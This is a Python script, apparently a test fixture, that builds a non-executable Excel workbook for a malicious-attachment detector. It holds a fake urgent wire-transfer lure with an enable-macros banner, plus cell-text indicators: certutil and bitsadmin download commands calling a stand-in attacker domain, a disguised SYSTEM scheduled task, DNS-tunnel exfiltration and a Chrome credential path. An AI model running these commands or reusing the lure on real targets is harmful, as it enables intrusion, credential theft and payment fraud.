"""
ShopSquire Security Detection Test — XLSM Generator
====================================================
Creates a BENIGN .xlsm workbook containing LOLBin and C2 indicator strings
as CELL TEXT only — no executable VBA code.

Purpose: feed indicator strings to passive_payload_analysis.classify_passive_payload()
via the OOXML text extraction pipeline once email_attachment_parser.py FIX-01 is applied.

Run: python scripts/create_detection_test_xlsm.py
"""

import os
import sys
import zipfile
import io

OUTPUT = os.path.join(os.path.dirname(__file__), "..", "dump", "Sec",
                      "Harbourside_Acquisition_Details_CONFIDENTIAL.xlsm")
OUTPUT = os.path.normpath(OUTPUT)

try:
    from openpyxl import Workbook
    from openpyxl.styles import Font, PatternFill, Alignment
except ImportError:
    print("ERROR: pip install openpyxl")
    sys.exit(1)


def build_workbook() -> Workbook:
    wb = Workbook()

    # ── Sheet 1: Visible summary with macro-enable banner ─────────────────────
    ws1 = wb.active
    ws1.title = "Acquisition Summary"
    ws1.column_dimensions["A"].width = 80

    ws1["A1"] = (
        "ENABLE CONTENT — This document uses macros to display "
        "confidential acquisition financial models."
    )
    ws1["A1"].font = Font(bold=True, color="FFFFFF", size=11)
    ws1["A1"].fill = PatternFill("solid", fgColor="CC0000")

    rows = [
        "BalashnikovAI — Project Meridian — Acquisition Summary — CONFIDENTIAL",
        "Form Reference: WTA-2026-0847 | Requested By: Boris Petrov | Division: Risk & Compliance",
        "Acquisition Target: Harbourside Capital Partners Pty Ltd",
        "Total Acquisition Deposit: AUD $85,000.00",
        "Value Date: 26 February 2026 | Priority: URGENT — 4 HOUR SLA",
        "Classification: CONFIDENTIAL — DO NOT DISTRIBUTE",
        "Sub Auto_Open and Workbook_Open macros load the financial model on open.",
    ]
    for i, text in enumerate(rows, start=2):
        ws1[f"A{i}"] = text

    # ── Sheet 2: Wire transfer details (payment correlation) ──────────────────
    ws2 = wb.create_sheet("Wire Transfer Details")
    ws2.column_dimensions["A"].width = 30
    ws2.column_dimensions["B"].width = 50

    financial = [
        ("Beneficiary Name",  "Harbourside Capital Partners Pty Ltd"),
        ("Bank",              "ANZ Banking Group"),
        ("BSB",               "012-456"),
        ("Account Number",    "8877 3421"),
        ("SWIFT/BIC",         "ANZBAU3M"),
        ("Amount (AUD)",      "$85,000.00"),
        ("Reference",         "ACQUISITION DEPOSIT — URGENT"),
        ("Confidentiality",   "DO NOT DISCUSS — strict NDA terms executed 24 February 2026"),
        ("Authorization",     "Verbal approval pending — Boris Petrov to confirm by return email"),
        ("Deposit Required",  "Yes — secures exclusive negotiation rights before competing bidder"),
        ("Processing Window",  "Within 4 hours of authorization — failure may result in loss of deal"),
    ]
    for row_idx, (label, value) in enumerate(financial, start=1):
        ws2.cell(row=row_idx, column=1, value=label).font = Font(bold=True)
        ws2.cell(row=row_idx, column=2, value=value)

    # ── Sheet 3: LOLBin indicator strings (detection target — NOT executable) ─
    ws3 = wb.create_sheet("_SecurityAudit")
    ws3["A1"] = "SHOPSQUIRE DETECTION TEST ARTIFACT — NOT EXECUTABLE — static analysis target only"
    ws3["A2"] = "Classification: BENIGN | MITRE ATT&CK: T1204.002 T1059.001 T1218.003 T1197 T1053.005"

    lolbin_indicators = [
        "Sub Auto_Open() — macro auto-execution trigger on workbook open",
        "Sub Workbook_Open() — backup macro trigger if Auto_Open blocked",
        "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command",
        "IEX (Invoke-Expression) — dynamic command execution via PowerShell",
        "fromBase64String — base64 encoded payload transport",
        "certutil.exe -urlcache -split -f http://balashnikovai-cdn.com/stage2.txt C:\\Users\\Public\\update.ps1",
        "bitsadmin /transfer WindowsUpdate /download /priority HIGH http://balashnikovai-cdn.com/beacon.ps1 C:\\Users\\Public\\svchost.ps1",
        "bitsadmin /SetNotifyCmdLine SystemMaintenance powershell.exe C:\\Users\\Public\\svchost.ps1",
        "schtasks /create /tn MicrosoftEdgeUpdateTaskMachineCore /sc minute /mo 30 /ru SYSTEM /f",
        "nslookup $encoded.balashnikovai-cdn.com — DNS tunneling exfiltration",
        "CreateObject(WScript.Shell) — shell command execution via COM",
        "Shell() — VBA direct shell execution",
        "Invoke-WebRequest net.webclient DownloadString DownloadFile",
        "memorystream [reflection.assembly] — fileless payload loading",
        "amsiutils — AMSI bypass attempt",
        "Start-Process -WindowStyle Hidden — stealthy process launch",
        "Exfil path 1: C:\\Users\\Public\\update.ps1",
        "Exfil path 2: C:\\Users\\Public\\svchost.ps1 (mimics SYSTEM process)",
        "Exfil path 3: C:\\Users\\Public\\beacon.log",
        "Credential target: C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
        "Scheduled task name: MicrosoftEdgeUpdateTaskMachineCore (fake Microsoft task)",
        "Scheduled task interval: /sc minute /mo 30 (beaconing every 30 minutes)",
    ]
    for row_idx, text in enumerate(lolbin_indicators, start=3):
        ws3.cell(row=row_idx, column=2, value=text)

    # ── Sheet 4: C2 and network indicators (detection target) ────────────────
    ws4 = wb.create_sheet("_NetworkIndicators")
    ws4["A1"] = "C2 Infrastructure Indicators — DETECTION TESTING ONLY — NOT LIVE INFRASTRUCTURE"

    c2_indicators = [
        "c2_server: balashnikovai-cdn.com",
        "c2_server: balashnikovai-analytics.com",
        "dns_tunnel: *.balashnikovai-cdn.com (Base64 encoded subdomain exfiltration)",
        "beaconing: interval=1800 jitter=0 dst=balashnikovai-cdn.com",
        "callback: http://balashnikovai-analytics.com/track/WTA-2026-0847",
        "command and control: check-in every 30 minutes via DNS TXT record lookup",
        "C2 domain registration: 18 Feb 2026 — 8 days old at time of attack",
        "DNS query pattern: YmFsYXNo[BASE64].balashnikovai-cdn.com — CV < 0.05",
        "beacon:interval=1800 — regular beaconing signature",
        "heartbeat to balashnikovai-cdn.com port 53 UDP",
        "data exfiltration via DNS subdomain — nslookup with encoded system info",
        "MITRE T1071.004 — Application Layer Protocol: DNS",
        "MITRE T1048.003 — Exfiltration Over Alternative Protocol: DNS",
    ]
    for row_idx, text in enumerate(c2_indicators, start=2):
        ws4.cell(row=row_idx, column=2, value=text)

    return wb


def main() -> None:
    wb = build_workbook()
    wb.save(OUTPUT)
    print(f"\nCreated: {OUTPUT}")
    print(f"Size: {os.path.getsize(OUTPUT):,} bytes")
    print()
    print("Detection targets embedded in cell text:")
    print("  Sheet 1: 'enable content', 'enable macros', 'Sub Auto_Open' -> macros hypothesis")
    print("  Sheet 3: powershell, certutil, bitsadmin, schtasks, IEX, fromBase64String -> lolbin_command_sequence hypothesis")
    print("  Sheet 4: balashnikovai-cdn.com, beaconing, interval=, callback, command and control -> c2_beacon hypothesis")
    print()
    print("NOTE: This file contains NO executable VBA code.")
    print("      Apply FIX-01 to email_attachment_parser.py before testing.")

    # Quick self-test: verify the file is a valid zip with the expected sheets
    try:
        with zipfile.ZipFile(OUTPUT) as zf:
            names = zf.namelist()
            sheet_xmls = [n for n in names if n.startswith("xl/worksheets/sheet")]
            print(f"\nZip validation: {len(names)} entries, {len(sheet_xmls)} worksheet XMLs")
    except Exception as e:
        print(f"WARNING: zip validation failed: {e}")


if __name__ == "__main__":
    main()
